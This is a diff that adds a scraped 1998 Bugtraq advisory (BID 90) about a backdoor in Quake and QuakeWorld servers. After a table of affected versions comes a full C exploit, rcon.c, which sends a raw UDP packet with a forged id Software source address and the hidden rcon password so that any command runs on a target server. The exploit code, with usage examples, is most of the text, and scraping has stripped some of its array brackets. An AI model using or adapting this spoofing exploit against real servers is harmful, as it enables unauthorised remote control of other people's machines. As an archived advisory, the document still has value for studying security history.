@@ -1,0 +1,127 @@
+#SpeeDr00t@Black Falcon<br>#bid90<p><b><span style="font-size: 18pt;">Quake Server Backdoor Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/90/info">info</a><br><a href="http://www.securityfocus.com/bid/90/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/90/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/90/solution">solution</a><br><a href="http://www.securityfocus.com/bid/90/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				90
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 01 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 01 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was found by Mark Zielinski &lt;markz@repsec.com&gt; of Repent security Incorporated.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					id Software Solaris Quake II 3.14 <br/>
+					
+				
+					id Software Solaris Quake II 3.13 <br/>
+					
+				
+					id Software QuakeWorld 2.1 <br/>
+					
+				
+					id Software QuakeWorld 2.0 <br/>
+					
+				
+					id Software Quake II 3.14 <br/>
+					
+				
+					id Software Quake II 3.13 <br/>
+					
+				
+					id Software Quake 1.9 <br/>
+					
+				
+					id Software Linux QuakeWorld 2.1 <br/>
+					
+				
+					id Software Linux Quake II 3.14 a<br/>
+					
+				
+					id Software Linux Quake II 3.13 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					id Software Linux QuakeWorld 2.2 <br/>
+					
+				
+					id Software Linux Quake II 3.15 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	/* rcon.c<br/>  Quake  world rcon_password bug implimentation by Jeff Roberson, &lt;jroberson@chesapeake.net&gt; (VallaH)<br/>  Linux 2.0.33 source, will compile on BSD if you modify the ip header etc.<br/>  Please note that I did not discover this, I simply wrote the code.<br/>  Thanks to Nick Toomey, &lt;ntoomey@chesapeake.net&gt; (Grifter)<br/><br/>  Brief summary:<br/>      Any rcon command coming from the idsoftware subnet 192.246.40 with the rcon password of tms will be accepted  on any server.  This program simply spoofs a packet from vader.idsoftware.com (random pick) to whatever server you  identify.<br/>      If you are connected to a network with a small MTU (e.g. PPP) change the buffer 'buf' from 512 bytes to something somewhat smaller than your MTU.<br/><br/>  Usage:<br/>        ./rcon ip/host "what you want to do" port<br/>  Example:<br/>        ./rcon quake.idsoftware.com "say This program works, thanks Jeff" 27500<br/>         the port argument is optional, you may omit it if you like and it will default to 27500.<br/>*/<br/>#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;<br/>#include &lt;unistd.h&gt;<br/>#include &lt;string.h&gt;<br/>#include &lt;netdb.h&gt;<br/>#include &lt;netinet/in.h&gt;<br/>#include &lt;netinet/ip.h&gt;<br/>#include &lt;netinet/udp.h&gt;<br/>#include &lt;arpa/inet.h&gt;<br/>#include &lt;sys/types.h&gt;<br/>#include &lt;sys/time.h&gt;<br/>#include &lt;sys/socket.h&gt;                                                <br/><br/>#define SIP "192.246.40.42" /* vader.idsoftware.com */<br/>#define command "Ã¿Ã¿Ã¿Ã¿rcon tms "<br/><br/>u_long resolve_address(u_char *host)<br/>{<br/>        struct  in_addr addr;<br/>        struct  hostent *he;<br/><br/>        if((addr.s_addr = inet_addr(host)) == -1) {<br/>                if (!(he = gethostbyname(host))) {<br/>                        printf("Unknown address: %s\n", host); <br/>                        exit(-1);<br/>                }<br/>                bcopy(he-&gt;h_addr, (char *)&amp;addr.s_addr, he-&gt;h_length);<br/>        }<br/>        return(addr.s_addr);<br/>}<br/>int main(int argc, char **argv)<br/>{<br/>        int     s;<br/>        int     port=27500;<br/>        char    buf512;<br/>        struct  sockaddr_in dst;<br/>        struct  iphdr *iph=(struct iphdr *)buf;<br/>        struct  udphdr *udp=(struct udphdr *)(buf + 20);<br/><br/>        if (argc&lt;3) {<br/>                printf("usage:\n");<br/>                printf("\t%s ip ""command"" &lt;port&gt;\n", argv0);<br/>                exit(-1);<br/>        }<br/>        if (argc==4) port = atoi(argv3);<br/>        bzero(buf, sizeof(buf));<br/>        bzero((char *)&amp;dst, sizeof(dst));<br/><br/>        iph-&gt;version=4;<br/>        iph-&gt;ihl=5;<br/>        iph-&gt;tos=0;<br/>        iph-&gt;tot_len=htons(sizeof(buf));<br/>        iph-&gt;id=htons(1234);<br/>        iph-&gt;frag_off=0;<br/>        iph-&gt;ttl=255;<br/>        iph-&gt;protocol=17;<br/><br/>        iph-&gt;saddr=inet_addr(SIP);<br/>        iph-&gt;daddr=resolve_address(argv1);<br/><br/>        udp-&gt;source=htons(1234);<br/>        udp-&gt;dest=htons(port);<br/>        udp-&gt;len=htons(sizeof(buf) - 20);<br/><br/>        dst.sin_family=PF_INET;<br/>        dst.sin_addr.s_addr=iph-&gt;daddr;<br/>        dst.sin_port=htons(27500);<br/><br/>        sprintf((buf + 28), "%s%s\n", command, argv2); <br/><br/>        if ((s=socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) {<br/>                perror("socket");<br/>                exit(-1);<br/>        }<br/><br/>        if ((sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&amp;dst, sizeof(dst))) &lt;=0) {<br/>                perror("sendto");<br/>                exit(-1);<br/>        }<br/>        exit(1);<br/>}
+	
+		<ul>
+</ul>
+</div>
